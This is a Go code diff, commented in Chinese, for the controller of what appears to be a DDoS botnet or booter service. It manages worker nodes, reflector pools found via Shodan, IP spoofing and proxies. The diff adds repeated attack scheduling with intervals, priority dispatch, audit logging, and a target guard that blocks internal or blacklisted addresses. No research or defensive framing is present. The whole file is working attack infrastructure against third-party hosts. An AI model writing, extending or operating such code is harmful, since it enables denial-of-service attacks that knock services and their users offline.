@@ -97,6 +97,18 @@ type TaskInfo struct {
 	// FinishedAt 进入终态（completed/failed）的时刻：内存任务保留 10 分钟后
 	// 由 watchTaskTimeout 清理（历史已落库 attack_logs，可安全删除）。
 	FinishedAt time.Time `json:"finished_at"`
+	// 重复攻击调度：RepeatCount=总次数（0/1=单次），RepeatLeft=剩余次数，
+	// RepeatInterval=间隔秒，NextRunAt=下一次执行时间（未到不派发）。
+	// 自然完成时递减 RepeatLeft 并创建续发任务；用户 stop 终止整个序列。
+	RepeatCount    int       `json:"repeat_count"`
+	RepeatLeft     int       `json:"repeat_left"`
+	RepeatInterval int       `json:"repeat_interval"`
+	NextRunAt      time.Time `json:"next_run_at"`
+	StoppedByUser  bool      `json:"-"`
+	// Priority 1=高优先级（插队派发），0=普通
+	Priority int `json:"priority"`
+	// ParentTaskID 重复序列的起始任务 ID（用于终止整个序列）
+	ParentTaskID string `json:"parent_task_id,omitempty"`
 }
 
 type TaskStats struct {
@@ -193,6 +205,12 @@ type Ctrl struct {
 	migrateMu     sync.RWMutex
 	migrateTarget string
 	migrateToken  string
+	// 目标保护规则（见 target_guard.go）：防止误攻击内网/黑名单目标
+	guardFile string
+	guard     TargetGuard
+	guardMu   sync.RWMutex
+	// 操作审计（见 audit.go）：谁/何时/做了什么
+	auditLog *AuditLog
 	// 编译信息：Version 标记 Controller 自身（与 Worker 版本对齐），
 	// GitRepo 用于云更新默认 GitHub Release 下载地址拼接
 	build BuildInfo
@@ -370,6 +388,9 @@ func New(grpcAddr, httpAddr string, build BuildInfo) *Ctrl {
 		nodesFile:         "data/nodes.json",
 		nodeGroupsFile:    "data/node_groups.json",
 		nodeGroups:        loadNodeGroups("data/node_groups.json"),
+		guardFile:         "data/target_guard.json",
+		guard:             loadTargetGuard("data/target_guard.json"),
+		auditLog:          NewAuditLog("data/audit.log", 5000),
 		build:             build,
 	}
 
@@ -425,6 +446,20 @@ func loadDomainList(path string) []string {
 		}
 	}
 	return domains
+}
+
+// guardHandler /api/guard：GET 规则（worker 可读），PUT/POST 修改（仅 admin）
+func (c *Ctrl) guardHandler() http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		switch r.Method {
+		case "GET":
+			c.handleGuard(w, r)
+		case "PUT", "POST":
+			c.authAdmin(c.handleGuard).ServeHTTP(w, r)
+		default:
+			http.Error(w, `{"error":"method not allowed"}`, 405)
+		}
+	}
 }
 
 func (c *Ctrl) Start() error {
@@ -487,6 +522,7 @@ func (c *Ctrl) Start() error {
 	mux.HandleFunc("/api/shodan/countries", c.authHTTP(c.handleShodanCountries))
 	mux.HandleFunc("/api/shodan", c.authHTTP(c.handleShodanConfig))
 	mux.HandleFunc("/api/pools", c.authHTTP(c.handlePools))
+	mux.HandleFunc("/api/pools/stats", c.authHTTP(c.handlePoolStats))
 	mux.HandleFunc("/api/pools/", c.authHTTP(c.handlePoolByGame))
 	mux.HandleFunc("/api/reflectors/all", c.authHTTP(c.handleReflectorsAll))
 	mux.HandleFunc("/api/reflectors/candidates", c.authHTTP(c.handleReflectorsCandidates))
@@ -496,6 +532,8 @@ func (c *Ctrl) Start() error {
 	mux.HandleFunc("/api/reflectors/manual/test", c.authHTTP(c.handleReflectorsManualTest))
 	mux.HandleFunc("/api/auth", c.handleAuth)
 	mux.HandleFunc("/api/templates", c.authHTTP(c.handleTemplates))
+	mux.HandleFunc("/api/guard", c.guardHandler())
+	mux.HandleFunc("/api/audit", c.authAdmin(c.handleAudit))
 	mux.HandleFunc("/api/logs", c.authHTTP(c.handleLogs))
 	mux.HandleFunc("/api/logs/stats", c.authHTTP(c.handleLogStats))
 	mux.HandleFunc("/api/logs/", c.authHTTP(c.handleLogs))
@@ -827,6 +865,11 @@ func (c *Ctrl) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.Hea
 		if t == nil || t.Status != "pending" {
 			continue
 		}
+		// 定时（重复攻击）任务未到执行时间：保留队列，不派发
+		if t.NextRunAt.After(time.Now()) {
+			rem = append(rem, tid)
+			continue
+		}
 		// 任务指定了参与节点：非选中节点跳过（不派发也不计入完成判定）
 		if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, req.WorkerId) {
 			rem = append(rem, tid)
@@ -1134,6 +1177,23 @@ func (c *Ctrl) finishCancellingTask(t *TaskInfo) {
 	} else {
 		t.Status = "completed"
 		t.FinishedAt = time.Now()
+		t.StoppedByUser = true
+		// 用户 stop 终止整个重复序列：删除同序列尚未执行的定时任务
+		seqRoot := t.ParentTaskID
+		if seqRoot == "" {
+			seqRoot = t.TaskID
+		}
+		var newPending []string
+		for _, tid := range c.pendingIDs {
+			pt := c.tasks[tid]
+			if pt != nil && pt.ParentTaskID == seqRoot && pt.TaskID != t.TaskID {
+				delete(c.tasks, tid)
+				log.Printf("[task] %s repeat sequence cancelled by user stop, removed scheduled %s", seqRoot, tid)
+				continue
+			}
+			newPending = append(newPending, tid)
+		}
+		c.pendingIDs = newPending
 		entry := c.buildTaskLog(t)
 		go c.logTaskComplete(entry)
 		log.Printf("[task] %s cancelled, all workers confirmed stop", t.TaskID)
@@ -1428,6 +1488,7 @@ func (c *Ctrl) handleKickNode(w http.ResponseWriter, r *http.Request) {
 	delete(c.nodes, id)
 	c.mu.Unlock()
 
+	c.auditAction(r, "node_kick", id)
 	log.Printf("[node] %s kicked (will self-exit on next heartbeat)", id)
 	c.persistNodes()
 	c.broadcastWS("nodes", c.listNodesForBroadcast())
@@ -1451,6 +1512,7 @@ func (c *Ctrl) handleUnkickNode(w http.ResponseWriter, r *http.Request) {
 	c.mu.Lock()
 	delete(c.kicked, id)
 	c.mu.Unlock()
+	c.auditAction(r, "node_unkick", id)
 	log.Printf("[node] %s unkicked", id)
 	writeJSON(w, map[string]interface{}{"ok": true})
 }
@@ -1471,6 +1533,11 @@ func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 			BurstMode    bool     `json:"burst_mode"`
 			JitterMs     int32    `json:"jitter_ms"`
 			SpoofIP      bool     `json:"spoof_ip"`
+			// 重复攻击：repeat_count=总次数（1-1000，1=单次），repeat_interval=间隔秒
+			RepeatCount    int `json:"repeat_count"`
+			RepeatInterval int `json:"repeat_interval"`
+			// Priority 1=高优先级（插队派发）
+			Priority int `json:"priority"`
 			// *bool：nil（请求未传）→ 默认开启。反射器攻击在不支持伪造的
 			// worker 上无法到达目标，默认降级可避免 4/5 的节点做无效攻击。
 			FallbackToUDP *bool           `json:"fallback_to_udp"`
@@ -1508,6 +1575,23 @@ func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 		}
 		if len(req.SubAttacks) > 20 {
 			writeJSON(w, map[string]string{"error": "too many sub_attacks (max 20)"})
+			return
+		}
+		// 重复攻击参数校验
+		if req.RepeatCount < 0 || req.RepeatCount > 1000 {
+			writeJSON(w, map[string]string{"error": "repeat_count must be 0-1000"})
+			return
+		}
+		if req.RepeatInterval < 0 || req.RepeatInterval > 86400 {
+			writeJSON(w, map[string]string{"error": "repeat_interval must be 0-86400 seconds"})
+			return
+		}
+		if req.Priority != 0 && req.Priority != 1 {
+			writeJSON(w, map[string]string{"error": "priority must be 0 or 1"})
+			return
+		}
+		if req.RepeatCount > 1 && req.RepeatInterval < 1 {
+			writeJSON(w, map[string]string{"error": "repeat_interval required when repeat_count > 1"})
 			return
 		}
 
@@ -1551,6 +1635,21 @@ func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 		target := req.Target
 		if target == "" && len(req.Targets) > 0 {
 			target = strings.Join(req.Targets, "\n")
+		}
+
+		// 目标保护：服务端强制校验所有目标（多行 target + targets 数组），
+		// 拦截内网/保留段/黑名单目标，防止误操作
+		var guardTargets []string
+		guardTargets = append(guardTargets, req.Targets...)
+		for _, line := range strings.Split(req.Target, "\n") {
+			if strings.TrimSpace(line) != "" {
+				guardTargets = append(guardTargets, line)
+			}
+		}
+		if err := c.validateTargets(guardTargets); err != nil {
+			guardBlockLog(err.Error())
+			writeJSON(w, map[string]string{"error": "target guard: " + err.Error()})
+			return
 		}
 
 		// 节点分组展开：组是节点的快捷多选，与显式 workers 取并集。
@@ -1604,6 +1703,11 @@ func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 		if req.FallbackToUDP != nil {
 			fallbackToUDP = *req.FallbackToUDP
 		}
+		// 重复攻击：首次创建时 RepeatLeft 为剩余续发次数
+		repeatLeft := 0
+		if req.RepeatCount > 1 {
+			repeatLeft = req.RepeatCount - 1
+		}
 		task := &TaskInfo{
 			TaskID:          taskID,
 			Target:          target,
@@ -1624,13 +1728,25 @@ func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 			Status:          "pending",
 			CreatedAt:       time.Now(),
 			Workers:         make(map[string]*TaskStats),
+			RepeatCount:     req.RepeatCount,
+			RepeatLeft:      repeatLeft,
+			RepeatInterval:  req.RepeatInterval,
+			Priority:        req.Priority,
+			ParentTaskID:    taskID, // 序列根任务即自身
 		}
 
 		c.mu.Lock()
 		c.tasks[taskID] = task
-		c.pendingIDs = append(c.pendingIDs, taskID)
+		if req.Priority == 1 {
+			// 高优先级：插队到派发队列头部
+			c.pendingIDs = append([]string{taskID}, c.pendingIDs...)
+		} else {
+			c.pendingIDs = append(c.pendingIDs, taskID)
+		}
 		c.mu.Unlock()
 
+		c.auditAction(r, "task_create", fmt.Sprintf("%s %s duration=%ds threads=%d repeat=%d interval=%ds priority=%d",
+			taskID, req.Method, req.Duration, req.Threads, req.RepeatCount, req.RepeatInterval, req.Priority))
 		log.Printf("[task] %s created: %s %s", taskID, req.Method, req.Target)
 		snapshot := c.getTaskInfo(taskID)
 		c.broadcastWS("task_created", snapshot)
@@ -1670,6 +1786,7 @@ func (c *Ctrl) handleTaskByID(w http.ResponseWriter, r *http.Request) {
 			}
 		}
 		c.mu.Unlock()
+		c.auditAction(r, "task_stop", taskID)
 		c.broadcastWS("task_update", c.getTaskInfo(taskID))
 		writeJSON(w, map[string]bool{"ok": true})
 		return
@@ -1934,6 +2051,7 @@ func (c *Ctrl) handleProxy(w http.ResponseWriter, r *http.Request) {
 
 		log.Printf("[proxy] updated (%d bytes)", len(data))
 		attack.LoadProxiesFromData(data)
+		c.auditAction(r, "proxy_update", fmt.Sprintf("%d bytes", len(data)))
 		writeJSON(w, map[string]interface{}{"ok": true, "size": len(data)})
 
 	default:
@@ -1974,6 +2092,7 @@ func (c *Ctrl) handleDeployConfig(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		log.Printf("[deploy] storage URL updated: %s", url)
+		c.auditAction(r, "deploy_config", url)
 		writeJSON(w, map[string]interface{}{"ok": true, "storage_url": url})
 
 	default:
@@ -2130,6 +2249,7 @@ func (c *Ctrl) handleDeployUpdate(w http.ResponseWriter, r *http.Request) {
 			payload, _ := json.Marshal(map[string]string{"version": "", "url": "", "sha256_linux": "", "sha256_windows": ""})
 			os.WriteFile(c.updateFile, payload, 0644)
 			log.Printf("[update] update config cleared")
+			c.auditAction(r, "deploy_update_clear", "")
 			writeJSON(w, map[string]interface{}{"ok": true, "version": "", "cleared": true})
 			return
 		}
@@ -2191,6 +2311,7 @@ func (c *Ctrl) handleDeployUpdate(w http.ResponseWriter, r *http.Request) {
 		} else {
 			log.Printf("[update] target version %s set but no git repo / custom url - workers have no download source", version)
 		}
+		c.auditAction(r, "deploy_update_set", version)
 		writeJSON(w, map[string]interface{}{"ok": true, "version": version})
 
 	case "GET":
@@ -2477,6 +2598,11 @@ func writeJSON(w http.ResponseWriter, v interface{}) {
 
 func (c *Ctrl) handlePools(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, reflector.GetPoolInfo())
+}
+
+// handlePoolStats GET /api/pools/stats — 池健康仪表盘数据
+func (c *Ctrl) handlePoolStats(w http.ResponseWriter, r *http.Request) {
+	writeJSON(w, reflector.GetPoolHealth())
 }
 
 func (c *Ctrl) handlePoolByGame(w http.ResponseWriter, r *http.Request) {
@@ -3544,6 +3670,36 @@ func (c *Ctrl) watchTaskTimeout() {
 	for range ticker.C {
 		c.mu.Lock()
 		for id, task := range c.tasks {
+			// 重复攻击续发：自然完成且仍有剩余次数 → 创建下一次任务
+			// （用户 stop 的任务 StoppedByUser=true，不续发）
+			if task.Status == "completed" && !task.StoppedByUser && task.RepeatLeft > 0 {
+				task.RepeatLeft--
+				seqNum := task.RepeatCount - task.RepeatLeft
+				nextID := fmt.Sprintf("%s-r%d", task.ParentTaskID, seqNum)
+				next := *task
+				next.TaskID = nextID
+				next.Status = "pending"
+				next.CreatedAt = time.Now()
+				next.StartTime = time.Time{}
+				next.FinishedAt = time.Time{}
+				next.Workers = make(map[string]*TaskStats)
+				next.RetryCount = 0
+				next.CancelAcks = nil
+				next.CancelToRetry = false
+				next.StoppedByUser = false
+				next.NextRunAt = time.Now().Add(time.Duration(task.RepeatInterval) * time.Second)
+				next.ParentTaskID = task.ParentTaskID
+				c.tasks[nextID] = &next
+				if next.Priority == 1 {
+					c.pendingIDs = append([]string{nextID}, c.pendingIDs...)
+				} else {
+					c.pendingIDs = append(c.pendingIDs, nextID)
+				}
+				log.Printf("[task] %s repeat scheduled: next run %s (left=%d)",
+					nextID, next.NextRunAt.Format(time.RFC3339), next.RepeatLeft)
+				continue // 原任务保留为历史记录
+			}
+
 			// 终态任务清理：历史已落库 attack_logs（logTaskComplete），
 			// 内存任务保留 10 分钟后删除，防止长时间运行 c.tasks 无界增长。
 			if (task.Status == "completed" || task.Status == "failed") &&
@@ -3553,6 +3709,10 @@ func (c *Ctrl) watchTaskTimeout() {
 			}
 			switch task.Status {
 			case "pending":
+				// 定时（重复攻击）任务未到执行时间：跳过 30s 强制翻转
+				if task.NextRunAt.After(time.Now()) {
+					continue
+				}
 				// 保护：任务创建 30s 后仍有节点未领取（如攻击瞬间全体短暂掉线、
 				// 派发窗口被心跳节奏拉长），不再等待，已领取节点直接开打。
 				// 未领取的节点恢复上线后也不会收到该任务（running 不再派发）。
@@ -3672,6 +3832,7 @@ func (c *Ctrl) handleProvisionToken(w http.ResponseWriter, r *http.Request) {
 	c.workerTokensMu.Unlock()
 
 	log.Printf("[auth] provisioned new worker token: %s", tokenStr[:16]+"...")
+	c.auditAction(r, "token_provision", tokenStr[:16]+"...")
 	writeJSON(w, map[string]interface{}{
 		"success": true,
 		"token":   tokenStr,
@@ -3713,5 +3874,6 @@ func (c *Ctrl) handleRevokeToken(w http.ResponseWriter, r *http.Request) {
 	}
 
 	log.Printf("[auth] revoked worker token: %s", req.Token[:16]+"...")
+	c.auditAction(r, "token_revoke", req.Token[:16]+"...")
 	writeJSON(w, map[string]interface{}{"success": true})
 }
